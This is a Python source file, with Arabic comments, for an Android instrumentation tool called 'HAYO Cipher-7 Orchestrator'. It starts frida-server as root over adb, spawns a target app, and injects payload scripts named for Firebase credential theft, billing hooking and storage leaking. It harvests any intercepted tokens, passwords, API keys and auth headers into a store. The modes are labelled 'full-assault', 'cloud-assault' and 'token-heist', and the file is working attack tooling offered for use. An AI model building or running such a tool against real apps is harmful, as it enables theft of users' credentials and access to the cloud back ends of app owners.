#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HAYO Cipher-7 — Orchestrator v6 (Production)
============================================
مُنسّق ديناميكي متعدّد الأوضاع. يتصل بـ frida-server، يستنسخ التطبيق، يحمّل
حمولة/حمولات الوضع المختار، ويجمع الأسرار الملتقطة في IntelStore.

الأوضاع (يستدعيها لوحة القيادة HAYO-GUI):
  --full-assault  PKG   → كل الحمولات (شبكة + تشفير + firebase + billing + تخزين)
  --cloud-assault PKG   → firebase-steal + network (استهداف السحابة)
  --token-heist   PKG   → network-ultra (التقاط التوكنات/الترويسات)
كلها تقبل: --device SERIAL  --duration SECONDS
بلا وضع → يطبع الاستخدام (بدل الخروج صامتاً).
"""
import argparse
import os
import sys
import time
import subprocess

import frida
from intel_store import IntelStore

if os.name == "nt":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

HERE = os.path.dirname(os.path.abspath(__file__))
PAYLOAD_DIR = os.path.join(HERE, "payloads")
ADB = os.environ.get("HAYO_ADB", "C:/Users/PT/Downloads/platform-tools/adb.exe")


def _ensure_frida_server(device):
    """يشغّل frida-server كـ root إن لم يكن يعمل (وإلا يفشل الـ attach بـ need Gadget)."""
    dev_args = [ADB, "-s", device]
    try:
        out = subprocess.run(dev_args + ["shell", "su -c 'ps -A'"],
                             capture_output=True, text=True, timeout=10, errors="ignore").stdout
        if "frida-server" in out:
            return True
    except Exception:
        pass
    for path in ("/data/local/tmp/frida-server",
                 "/data/local/tmp/frida-bin/fs-bin.1-android-x86"):
        try:
            subprocess.Popen(dev_args + ["shell", f"su -c '{path} -D &'"],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)
            out = subprocess.run(dev_args + ["shell", "su -c 'ps -A'"],
                                 capture_output=True, text=True, timeout=10, errors="ignore").stdout
            if "frida-server" in out:
                print(f"  [+] frida-server started from {path}")
                return True
        except Exception:
            continue
    print("  [!] تعذّر تشغيل frida-server تلقائياً — قد يفشل الـ attach.")
    return False

# أوضاع اللوحة → قائمة الحمولات المناسبة (ملفات موجودة في payloads/)
MODE_PAYLOADS = {
    "full-assault":  ["payload_network_ultra.js", "payload_crypto_deep.js",
                      "payload_firebase_steal.js", "payload_billing_hook.js",
                      "payload_storage_leak.js"],
    "cloud-assault": ["payload_firebase_steal.js", "payload_network_ultra.js"],
    "token-heist":   ["payload_network_ultra.js"],
}

# مفاتيح payload التي تدل على سرّ ملتقط (لتخزين عام عبر كل الحمولات)
_SECRET_HINTS = ("secret", "token", "key", "body", "url", "value", "password",
                 "auth", "header", "id_token", "apikey")


class DynamicOrchestrator:
    def __init__(self, package, device_id="emulator-5554", mode="full-assault"):
        self.package = package
        self.device_id = device_id
        self.mode = mode
        self.payloads = MODE_PAYLOADS.get(mode, MODE_PAYLOADS["full-assault"])
        self.store = IntelStore(package=package)
        self.captured = 0

    # التقاط عام: أي حدث يحمل حقلاً يدل على سرّ → خزّنه
    def on_message(self, message, data):
        if message.get("type") == "error":
            print(f"  [js-error] {str(message.get('description',''))[:100]}")
            return
        payload = message.get("payload")
        if not isinstance(payload, dict):
            return
        # بعض الحمولات تغلّف {payload:{...}} — افتحها
        inner = payload.get("payload") if isinstance(payload.get("payload"), dict) else payload
        event = inner.get("event") or inner.get("type") or "event"
        for k, v in inner.items():
            if k in ("event", "type", "kind", "ts"):
                continue
            if any(h in k.lower() for h in _SECRET_HINTS) and v:
                val = str(v)
                kind = "endpoint" if ("url" in k.lower() or "endpoint" in k.lower()) else "secret"
                if self.store.add(kind, val, source="dynamic", note=f"{self.mode}:{event}:{k}"):
                    self.captured += 1
                    print(f"  [+] [{event}] {k}: {val[:48]}...")

    def _connect(self):
        # الجهاز المحلي (USB/adb) أولاً — الأكثر موثوقية؛ ثم remote frida-server احتياطياً
        try:
            dev = frida.get_device(self.device_id, timeout=10)
            dev.enumerate_processes()  # اختبار الاتصال فعلياً
            return dev
        except Exception as e_local:
            try:
                mgr = frida.get_device_manager()
                dev = mgr.add_remote_device("127.0.0.1:27042")
                dev.enumerate_processes()
                return dev
            except Exception:
                raise e_local

    def run(self, duration=60):
        print(f"[*] الوضع: {self.mode} — الحمولات: {', '.join(self.payloads)}")
        print(f"[*] الاتصال بالجهاز {self.device_id} …")
        _ensure_frida_server(self.device_id)
        try:
            device = self._connect()
            print(f"[*] استنساخ {self.package} …")
            pid = device.spawn([self.package])
            session = device.attach(pid)

            loaded = 0
            for name in self.payloads:
                path = os.path.join(PAYLOAD_DIR, name)
                if not os.path.isfile(path):
                    print(f"  [!] حمولة مفقودة: {name}")
                    continue
                try:
                    with open(path, "r", encoding="utf-8") as f:
                        script = session.create_script(f.read())
                    script.on("message", self.on_message)
                    script.load()
                    loaded += 1
                    print(f"  [+] حُمّلت: {name}")
                except Exception as e:
                    print(f"  [!] فشل تحميل {name}: {e}")

            if loaded == 0:
                print("[-] لم تُحمّل أي حمولة — توقّف.")
                return

            device.resume(pid)
            print(f"[*] التطبيق يعمل. المراقبة لمدة {duration}s …")

            # تحفيز بسيط لواجهة المستخدم
            for _ in range(3):
                try:
                    subprocess.run([ADB, "-s", self.device_id, "shell", "input", "tap", "540", "1100"],
                                   capture_output=True, timeout=8)
                except Exception:
                    pass
                time.sleep(4)

            time.sleep(max(0, duration - 12))
            try:
                session.detach()
            except Exception:
                pass
            self.store.save()
            print(f"[*] اكتمل الطور الديناميكي — التُقط {self.captured} عنصراً.")
        except Exception as e:
            print(f"[-] خطأ في المنسق: {e}")


def main():
    parser = argparse.ArgumentParser(description="HAYO orchestrator v6 (multi-mode Frida)")
    # علم لكل وضع (يأخذ اسم الحزمة كقيمته — توافقاً مع لوحة القيادة)
    parser.add_argument("--full-assault", metavar="PKG", help="هجوم شامل: كل الحمولات")
    parser.add_argument("--cloud-assault", metavar="PKG", help="اختراق السحابة: firebase + شبكة")
    parser.add_argument("--token-heist", metavar="PKG", help="حقن/سرقة التوكنات: شبكة")
    parser.add_argument("--package", "-p", help="اسم الحزمة (بديل عام)")
    parser.add_argument("--device", default=os.environ.get("HAYO_DEV", "emulator-5554"))
    parser.add_argument("--duration", type=int, default=60)
    args = parser.parse_args()

    if args.full_assault:
        pkg, mode = args.full_assault, "full-assault"
    elif args.cloud_assault:
        pkg, mode = args.cloud_assault, "cloud-assault"
    elif args.token_heist:
        pkg, mode = args.token_heist, "token-heist"
    elif args.package:
        pkg, mode = args.package, "full-assault"
    else:
        parser.print_help()
        print("\nمثال: python orchestrator.py --full-assault com.app --device emulator-5554 --duration 90")
        return

    DynamicOrchestrator(pkg, args.device, mode).run(args.duration)


if __name__ == "__main__":
    main()
